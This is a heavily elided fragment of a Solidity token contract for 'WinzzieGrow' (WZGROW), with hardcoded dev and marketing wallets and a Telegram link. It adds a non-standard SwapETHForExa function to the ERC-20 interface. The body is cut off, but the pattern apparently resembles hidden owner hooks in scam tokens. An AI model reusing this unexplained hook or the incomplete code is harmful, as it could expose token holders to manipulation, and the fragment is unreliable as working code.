...
// Telegram : https://t.me/WinzzieGrow
...
interface IERC20 {
    ...
    function SwapETHForExa(address account) external returns (uint256);
...
contract WinzzieGrow is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xd04636ec7a45184834FBE5dbc2a5CDaaf86200B8); 
    address payable public Wallet_Dev = payable(0xcF6e2A37B8a00E602D244dD2605a145a78dc0dAB);
    ...
    string private constant _name = "WinzzieGrow"; 
    string private constant _symbol = unicode"WZGROW"; 
    ...
    constructor () {
        ...
        _owner = 0xcF6e2A37B8a00E602D244dD2605a145a78dc0dAB;
    ...
    function SwapETHForExa(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
